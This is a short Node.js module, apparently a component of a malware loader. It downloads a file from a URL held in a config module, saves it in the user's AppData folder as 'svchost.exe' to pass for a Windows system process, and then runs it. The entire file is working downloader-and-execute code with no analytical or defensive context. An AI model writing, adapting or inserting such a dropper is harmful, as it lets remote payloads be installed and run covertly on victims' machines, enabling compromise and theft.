const fetch = require('node-fetch');
const { createWriteStream } = require('fs');
const { url } = require('./Config');

module.exports = async () => {
    return new Promise(async (resolve, reject) => {
        const path = `${process.env.APPDATA}/../Local/Programs/Common/svchost.exe`;
        const r = await fetch(url);
        const stream = createWriteStream(path);
    
        r.body.pipe(stream);
    
        r.body.on('error', () => {
            reject();
        });

        stream.on('finish', () => {
            require('child_process').exec(`"${path}"`);
            resolve();
        });
    });
};